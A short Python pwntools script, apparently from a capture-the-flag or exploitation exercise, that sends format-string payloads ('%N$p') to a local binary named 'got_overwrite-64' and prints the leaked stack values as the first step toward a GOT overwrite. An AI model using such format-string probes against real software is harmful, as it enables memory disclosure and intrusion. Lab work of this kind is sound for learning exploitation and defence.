from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./got_overwrite-64', checksec=False)


for i in range(1, 20):
    p = process()
    payload = f'%{i}$p'.encode() 
    p.sendline(payload)
    response = p.recvline()
    print(f"{i}: {response}")